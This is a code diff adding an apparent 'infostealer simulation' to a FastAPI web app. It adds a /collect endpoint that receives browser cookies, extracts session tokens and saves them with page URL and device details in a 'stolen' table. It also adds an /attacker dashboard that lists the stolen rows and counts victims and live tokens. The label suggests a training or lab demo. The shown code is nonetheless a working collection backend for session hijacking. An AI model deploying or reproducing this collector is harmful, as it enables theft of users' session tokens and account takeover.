@@ -199,3 +199,60 @@ async def logout():
 @app.get("/health")
 async def health():
     return {"status": "ok"}
+
+# ── Infostealer симуляция ────────────────────────────
+@app.get("/stealer", response_class=HTMLResponse)
+async def stealer_page(request: Request):
+    return templates.TemplateResponse(request, "stealer.html")
+
+@app.post("/collect")
+async def collect(request: Request):
+    import json
+    try:
+        data = await request.json()
+    except Exception:
+        return {"status": "error"}
+
+    cookies_raw = data.get("cookies", "")
+    token = None
+    for part in cookies_raw.split(";"):
+        part = part.strip()
+        if part.startswith("token="):
+            token = part[6:]
+            break
+
+    conn = get_conn()
+    conn.execute("""CREATE TABLE IF NOT EXISTS stolen (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        token TEXT, cookies TEXT, url TEXT,
+        useragent TEXT, screen TEXT, language TEXT,
+        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
+    conn.execute(
+        "INSERT INTO stolen (token,cookies,url,useragent,screen,language) VALUES (?,?,?,?,?,?)",
+        (token, cookies_raw,
+         data.get("url",""), data.get("useragent",""),
+         data.get("screen",""), data.get("language",""))
+    )
+    conn.commit()
+    return {"status": "ok"}
+
+@app.get("/attacker", response_class=HTMLResponse)
+async def attacker_panel(request: Request):
+    conn = get_conn()
+    conn.execute("""CREATE TABLE IF NOT EXISTS stolen (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        token TEXT, cookies TEXT, url TEXT,
+        useragent TEXT, screen TEXT, language TEXT,
+        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
+    rows = conn.execute(
+        "SELECT * FROM stolen ORDER BY id DESC LIMIT 50"
+    ).fetchall()
+
+    victims = len(set(r["useragent"] for r in rows if r["useragent"]))
+    active  = sum(1 for r in rows if r["token"])
+
+    return templates.TemplateResponse(request, "attacker.html", {
+        "stolen":  rows,
+        "victims": victims,
+        "active":  active,
+    })
